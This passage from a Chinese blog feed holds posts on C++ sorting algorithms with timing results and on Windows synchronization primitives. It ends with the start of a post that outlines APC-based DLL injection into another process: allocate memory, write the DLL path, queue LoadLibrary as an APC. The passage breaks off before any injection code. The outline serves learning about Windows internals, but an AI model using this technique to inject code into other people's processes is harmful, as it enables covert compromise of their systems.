class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Container&gt;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">shellSort</span><span class="params">(Container&amp; arr)</span> </span>&#123;</span><br><span class="line">std::deque&lt;<span class="type">int</span>&gt;gap = &#123;&#125;;</span><br><span class="line"><span class="keyword">auto</span> first = std::<span class="built_in">begin</span>(arr);</span><br><span class="line"><span class="keyword">auto</span> end = std::<span class="built_in">end</span>(arr);</span><br><span class="line"><span class="keyword">auto</span> len = std::<span class="built_in">distance</span>(first, end);</span><br><span class="line"><span class="keyword">auto</span> gapinit = [&amp;gap](<span class="type">int</span> len, std::function&lt;<span class="built_in">int</span>(<span class="type">int</span>)&gt; func)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;; i++) &#123;</span><br><span class="line"><span class="type">int</span> x = <span class="built_in">func</span>(i);</span><br><span class="line"><span class="keyword">if</span> (x &gt; len)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">gap.<span class="built_in">insert</span>(gap.<span class="built_in">begin</span>(), x);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">auto</span> sort = [first, end](Container&amp; container, <span class="type">int</span> gap)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> len = std::<span class="built_in">distance</span>(first, end);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = gap; i &lt; len; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> tmp = (*(first + i));</span><br><span class="line"><span class="type">int</span> j;</span><br><span class="line"><span class="keyword">for</span> (j = i; j &gt;= gap &amp;&amp; *(first + j - gap) &gt; tmp; j -= gap)</span><br><span class="line">&#123;</span><br><span class="line">*(first + j) = *(first + j - gap);</span><br><span class="line">&#125;</span><br><span class="line">*(first + j) = (tmp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">gapinit</span>(len, [](<span class="type">int</span> i) &#123;</span><br><span class="line"><span class="keyword">return</span> std::<span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> g : gap) &#123;</span><br><span class="line"><span class="built_in">sort</span>(arr, g);</span><br><span class="line"><span class="built_in">pArr</span>(arr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间测试</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00008865</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">0</span>.<span class="number">88646020</span></span><br></pre></td></tr></table></figure><p>可以看出，速度相较之前的两个提升了5倍不止。</p><p>对于希尔算法的时间复杂度，需要额外考虑gap的值，不同的值对应不同的复杂度，比如说增量为2的倍数，那么同一个组中2的倍数会多次比较，改成<code>pow(3,i)</code>后</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00007897</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">0</span>.<span class="number">78967320</span></span><br></pre></td></tr></table></figure><p>很稳定地提高了大约0.1s。所以只能说大致来看时间复杂度在$O(nlog(n))$，对于以2的平方为间隔的，在完全倒序的情况下最差会退化到$O(n^2)$。查资料的时候发现，这是世界上第一个突破$O(n^2)$的排序算法，真强。<br>对于空间复杂度，由于额外占用一个tmp，所以为$O(1)$</p><h1>交换排序</h1><p>交换排序是指这一次排序的元素与其它元素交换最后实现的排序</p><h2 id="冒泡排序">冒泡排序</h2><p>稳定的排序</p><p>经典老熟人，就不多说了，直接上代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bubbleSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = len; j &gt; <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">bool</span> sorted = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; j - <span class="number">1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (arr[i] &gt; arr[i + <span class="number">1</span>]) &#123;</span><br><span class="line">sorted = <span class="literal">false</span>;</span><br><span class="line">std::<span class="built_in">swap</span>(arr[i], arr[i + <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//pArr(arr, 20);</span></span><br><span class="line"><span class="keyword">if</span> (sorted)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Container&gt;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bubbleSort</span><span class="params">(Container&amp; container)</span> </span>&#123;</span><br><span class="line"><span class="type">bool</span> sorted = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> end = std::<span class="built_in">end</span>(container); !sorted &amp;&amp; end != std::<span class="built_in">begin</span>(container); --end) &#123;</span><br><span class="line">sorted = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> it = std::<span class="built_in">begin</span>(container); std::<span class="built_in">next</span>(it) != end; ++it) &#123;</span><br><span class="line"><span class="keyword">if</span> (*it &gt; *std::<span class="built_in">next</span>(it)) &#123;</span><br><span class="line">std::<span class="built_in">swap</span>(*it, *std::<span class="built_in">next</span>(it));</span><br><span class="line">sorted = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">pArr</span>(container);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00132296</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">13</span>.<span class="number">22964510</span></span><br></pre></td></tr></table></figure><p>很慢，可能只适合小数组，定死的两重循环让它只能在$O(n^2)$上，除了运气很好刚好有序，则只需$O(n)$</p><p>空间复杂度$O(1)$</p><h2 id="快速排序">快速排序</h2><p><s>顾名思义，很快的排序</s>。每次排序时，定义一个基准值（一般是开头元素或结尾元素）然后从左和右分别引出指针，基准远离的那个指针开始向中心移动，遇到小于基准值的就复制到离基准近的位置，然后近的指针移动找大于基准值的，复制到远离基准的指针位置，两个指针相遇后，将基准赋值到这里。然后分别对左边和右边执行这个操作。因此要使用递归。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">quickSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">di</span> &#123;</span><br><span class="line">left,</span><br><span class="line">right</span><br><span class="line">&#125;;</span><br><span class="line">std::function&lt;<span class="type">void</span>(<span class="type">int</span>, <span class="type">int</span>)&gt; sort;</span><br><span class="line">sort = [&amp;arr, &amp;sort](<span class="type">int</span> is, <span class="type">int</span> ie) &#123;</span><br><span class="line"><span class="built_in">pArr</span>(arr, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">if</span> (is == ie)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (is + <span class="number">1</span> == ie) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[is] &gt; arr[ie])</span><br><span class="line">std::<span class="built_in">swap</span>(arr[is], arr[ie]);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">di diriction = right;</span><br><span class="line"><span class="type">int</span> ieb = ie;</span><br><span class="line"><span class="type">int</span> isb = is;</span><br><span class="line"><span class="keyword">auto</span> base = arr[is];</span><br><span class="line"><span class="keyword">while</span> (is &lt; ie) &#123;</span><br><span class="line"><span class="keyword">if</span> (diriction == right) &#123;</span><br><span class="line"><span class="keyword">while</span> (base &lt;= arr[ie] &amp;&amp; is &lt; ie)</span><br><span class="line">ie--;</span><br><span class="line">arr[is] = arr[ie];</span><br><span class="line">diriction = left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (base &gt; arr[is] &amp;&amp; is &lt; ie)</span><br><span class="line">&#123;</span><br><span class="line">is++;</span><br><span class="line">&#125;</span><br><span class="line">arr[ie] = arr[is];</span><br><span class="line">diriction = right;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">arr[is] = base;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; base &lt;&lt; std::endl;</span></span><br><span class="line"><span class="keyword">if</span> (is &gt; isb)</span><br><span class="line"><span class="built_in">sort</span>(isb, is - <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (is &lt; ieb)</span><br><span class="line"><span class="built_in">sort</span>(is + <span class="number">1</span>, ieb);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">sort</span>(<span class="number">0</span>, len - <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面就不写模板了QAQ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00006714</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">0</span>.<span class="number">67141270</span></span><br></pre></td></tr></table></figure><p>可以看出确实很快，比希尔又少了0.1s左右。由于每次是折半,所以速度是$O(nlog(n))$，最坏情况下，每次的枢轴是最大值或最少值，相当于二叉树退化为链表，所以是$O(n^2)$对应的，由于有折半次的递归，所以空间复杂度是$O(logn)$</p><h1>选择排序</h1><h2 id="简单选择排序">简单选择排序</h2><p>每次循环时选择一个最小的数，和当前轮次i的元素交换</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">selectSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="built_in">pArr</span>(arr, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index = i;</span><br><span class="line"><span class="type">int</span> min = arr[i];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; len; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (min &gt; arr[j]) &#123;</span><br><span class="line">min = arr[j];</span><br><span class="line">index = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">std::<span class="built_in">swap</span>(arr[i], arr[index]);</span><br><span class="line"><span class="built_in">pArr</span>(arr, <span class="number">20</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00045653</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">4</span>.<span class="number">56533570</span></span><br></pre></td></tr></table></figure><p>这个速度比直接插入快，我觉得是因为没有执行多轮的移动元素，是冒泡的改良，但是时间复杂度还是在$O(n^2)$，空间复杂度$O(1)$，有额外的2个空间使用。</p><h2 id="树形选择排序">树形选择排序</h2><h2 id="堆排序">堆排序</h2><p>由于我不会堆，所以这里先说堆的概念</p><h3 id="优先队列">优先队列</h3><p>优先队列是指一个队列不按来的顺序出队，而是根据优先级的顺序出队，这就是优先队列，<br>假设按a,b,c的顺序入队，优先级分别为1,3,2，如果按优先级高的先出，出队顺序为b,c,a。可以看出为了存储n个元素优先队列，我们需要2n的空间。这很明显是不划算的。同时为了出队，我们还要把出队元素放到队首(因为只有队首才能出队)，于是我们使用了堆。</p><h3 id="堆">堆</h3><p>堆是一颗完全二叉树，加入节点需要在最下面一层从左到右排列。堆分为两种，一个叫大顶堆一个叫小顶堆，它们的性质分别是二叉树的父节点大于/小于子节点，在初始赋值时，可能不满足这个要求，所以需要进行调整：</p><ul><li>对于树的根节点，判断条件是否满足，不满足，和子节点的值交换，满足，继续 下一步</li><li>递归对子节点执行上面的操作，直到这个子节点没有子节点</li></ul><p>时间复杂度为$O(n)$，因为对每一个节点都执行了上面的内容</p><p>删除时同样是先放到最下面一层最后（和最后一个元素交换）要保持完全二叉树的性质。然后交换后调整为对应顶堆的性质</p><h1>归并排序</h1><h1>基数排序</h1><h1>外部排序</h1><p>table[5*k+1]</p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
          <category> 数据结构与算法 </category>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>win-并发与同步</title>
      <link href="/posts/e563aa6c.html"/>
      <url>/posts/e563aa6c.html</url>
      
        <content type="html"><![CDATA[<p>上一篇学习了基本的进程和线程，这里继续学习Windows的并发与同步<br>《Windows内核原理与实现》</p><h2 id="并发与同步">并发与同步</h2><p>为了保证操作系统和应用有序地执行，它们读取和访问的数据应当是有效的。如果A线程使用了资源甲，进行了修改，同时B线程也对资源甲进行了修改，保存时就会产生冲突，所以我们需要一种(多种)机制去控制各个线程的顺序使得它们对资源的使用是协调的、合理的、安全的。</p><p><img src="https://s2.loli.net/2024/11/18/Ti2DFcLhquH8Qov.png" alt="并发的来源"></p><h3 id="基础">基础</h3><p>理想情况下,如果所有进程都具有执行条件,系统会直接根据优先级顺序将处理器资源分配给各个线程。因而唯一可能的线程冲突就是优先级的冲突。这很好解决，只要让高优先级的优先执行就好了。但是很有可能有的线程依赖另一个线程，或者依赖系统的某个信号和状态。</p><p>看下面这个书中的例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> g_nCount;</span><br><span class="line">DWORD <span class="title function_">ComputeThreadProc</span><span class="params">(PLVOID pParam)</span>&#123;</span><br><span class="line">    g_nCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(g_nCount++&lt;<span class="number">100</span>)&#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> g_nCount;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ControlThreadProc</span><span class="params">(PLVOID pRaram)</span>&#123;</span><br><span class="line">    CreateThread(ComputeThreadProc);</span><br><span class="line">    g_nCount=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果执行ControlThreadProc函数，可能发生什么，ComputeThreadProc中的汇编可能把g_nCount保存在两个寄存器中，用RCX来循环，用RAX来执行每一轮最后的判断，那么如果主线程内执行了g_nCount=100;，却被RCX赋值了，那么它就不会停止</p><p><img src="https://s2.loli.net/2024/11/18/cqb9BgR38V61SOC.png" alt="image-20241118135849061"></p><p>所以，多线程通信时，必须保证对变量的操作为原子操作或者对变量的访问是互斥的。</p><p>处理器中有些自带的原子操作命令，基本的指令前加lock即是原子操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LONG FASTCALL InterlockerIncrement(IN OUT LONG volatile *addr)</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">        mov eax,1</span><br><span class="line">        mov ecx,addr</span><br><span class="line">        lock xadd [ecx],eax</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，通过lock xadd，这组指令就会变成原子操作，其它线程的操作不能插入到这个过程中</p><h3 id="通讯与同步">通讯与同步</h3><p>正如上面所说，为了使程序以正常的顺序进行，我们需要一种机制去协调进程/线程对某些数据的操作，以通讯为基础的同步机制就这样诞生了。下面的操作均为原子操作</p><h4 id="互斥和互斥体">互斥和互斥体</h4><p>互斥指一个共享资源，任何时刻只能有一个主体可以访问。Windows中可以通过互斥体实现跨进程的访问</p><h5 id="互斥体同步对象">互斥体同步对象</h5><p>该对象有两种状态，有信号和无信号，有信号表示该对象当前无人访问。无信号表示其已被某线程拥有，只有当该线程释放所有权后它才会变为有信号状态。</p><h4 id="信号量">信号量</h4><p>对于一个资源，有一个标识值说明当前有多少对象在使用这个资源，这个值是信号量，当值为x时，表示还可以有x个对象访问它，访问叫做DOWN，每次访问使x-1，如果x本身为0，当前线程阻塞。当对象访问结束时，执行UP操作，使x+1然后令一个阻塞的线程执行DOWN获得资源的操作权限</p><h4 id="锁">锁</h4><p>和前面的类似，如果值为1，则不可访问并被阻塞，如果为0则可以访问，同时有局部和全局之分，如果是局部锁，它只控制一个小区域，反之是全局的控制。</p><h4 id="临界区">临界区</h4><p>对于一段临界区代码，同一时刻只有一个线程在其中执行。如果一个数据只在临界区中被访问，那么这个数据也是线程安全的。</p><p>临界区可以不连续，但是在进入时必须触发enter函数，离开时触发leave函数以用上面几种方法防止同时访问</p><h4 id="自旋锁和忙等待">自旋锁和忙等待</h4><p>忙等待：不断重复检查以第一时间获得信息。<br>自旋锁通过忙等待实现一个CPU在一段时间内对一个资源的同时拥有，即其它CPU会在这时重复检查是否可以使用这个资源，直到所有权释放</p><h4 id="消息">消息</h4><p>接收和发送。两个进程可以相互接收和发送消息，具体实现需要依赖其它同步原语</p><h3 id="同步问题">同步问题</h3><h4 id="死锁">死锁</h4><blockquote><p>如果一组线程中的每个线程都在等待只能由其他线程才能满足的条件，那 么这组线程是死锁的，所有的线程都将继续等待，无法前进。</p></blockquote><p>银行家算法</p><h4 id="饥饿">饥饿</h4><blockquote><p>饥饿是指一个进程或线程满足执行的条件，但一直得不到执行，甚至 永远得不到执行（“饿死”）。饥饿通常是由资源分配策略引起的，比如由于策略而导 致不公平，有些资源请求在特定的情形下永远得不到满足。</p></blockquote><h4 id="优先级反转">优先级反转</h4><blockquote><p>优先级反转是指这样的问题：在线程调度时，一个低优先级的线程占有一个共享资源， 从而导致高优先级的线程虽然其他运行条件都满足，但因为得不到该资源而无法运行。在 采用抢占式调度算法的操作系统中，当低优先级的线程占有了资源时，它有可能被中等优 先级的其他线程抢占，从而导致高优先级的线程在更长时间内无法运行，实际的效果就是， 相当于把高优先级的线程降到低优先级了。</p></blockquote><h3 id="中断与异常">中断与异常</h3><h4 id="中断">中断</h4><p>其它设备（比如IO）需要CPU响应时，会发送硬件中断给CPU，令其执行那个设备需要执行的内容。内核中的代码也可以发送软件中断，比如执行线程调度。CPU可以屏蔽中断用来专注执行一段指令，也就是使其变为原子操作。</p><h4 id="异常">异常</h4><p>异常也分为软件异常和硬件异常。它和当前的代码/线程有关。硬件异常有：除零错误，缺页错误等。软件异常有：软件断点陷阱等。当触发异常时，会按照固定流程执行处理异常的代码，并导致不同的结果(崩溃/继续执行)</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> Win核心 </category>
          
          <category> Win内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
            <tag> 锁 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APC注入</title>
      <link href="/posts/5fe10d5b.html"/>
      <url>/posts/5fe10d5b.html</url>
      
        <content type="html"><![CDATA[<h2 id="异步过程调用">异步过程调用</h2><p>Windows内核原理与实现一书：</p><p><img src="https://s2.loli.net/2024/11/18/MYfU1hFZHWbRvGV.png" alt="image-20241118124618497"></p><p><img src="https://s2.loli.net/2024/11/18/Zlq4GQ8nECaWxvi.png" alt="image-20241118124635696"></p><blockquote><p>APC（Asynchronous Procedure Call）异步过程调用是一种<code>Windows</code>操作系统的核心机制，它允许在进程上下文中执行用户定义的函数，而无需创建线程或等待OS执行完成。该机制适用于一些频繁的、短暂的或非常细微的操作，例如改变线程优先级或通知线程处理任务。在<code>APC机制</code>中，当某些事件发生时（例如文件IO，网络IO或定时器触发），这些事件将被操作系统添加到一个<code>APC队列</code>中，该队列绑定到执行线程。在下一次发生<code>ALERTABLE</code>的事件时（例如调用SleepEx或SignalObjectAndWait时），OS将弹出<code>APC函数</code>并在执行线程上下文中调用该函数，并在执行完毕后恢复线程执行。</p></blockquote><p>简要来说，一旦进程/线程请求某些操作（比如文件操作），操作系统会将它们加入到对应线程的APC队列，当线程恢复执行时，就会依次执行队列里的函数过程。APC队列分为内核APC队列和用户APC队列，同时两种又分为普通和特殊。对于内核队列，其中的APC会优先于用户队列执行完，等到从R0回到R3，就会执行一个用户普通APC。由于特殊用户APC会直接挂到队列开头，所以特殊APC总会优先执行，且一次性执行全部。</p><p>详见：<br>[<a href="https://bbs.kanxue.com/thread-276036.htm">原创]Win10 x64 APC的分析与玩法-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p><h2 id="APC注入">APC注入</h2><p>通过向目标进程加入APC就可以实现让它读取DLL的操作，由于我没有R0权限(没学提权)，只能在R3下尝试添加用户APC。</p><h3 id="条件">条件</h3><p>必须处于可唤醒状态，可以使用以下函数达成效果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SleepEx</span>(xxx,True);</span><br><span class="line"><span class="built_in">MsgWaitForMultipleObjectsEx</span>(xxx,xxx,xxx,xxx,True);</span><br><span class="line"><span class="built_in">WaitForSingleObjectEx</span>(xxx,xxx,True);</span><br><span class="line"><span class="built_in">WaitForMultipleObjectEx</span>(xxx,xxx,xxx,xxx,True);</span><br><span class="line"><span class="built_in">SignalObjectAndWait</span>(xxx,xxx,xxx,True);</span><br></pre></td></tr></table></figure><p>具体流程为：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取目标pid-&gt;申请空间-&gt;写入DLL路径-&gt;获取LoadLibrary地址-&gt;用APC挂钩函数挂上LoadLibrary函数，传参DLL路径</span><br></pre></td></tr></table></figure><p>直接写代码即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span 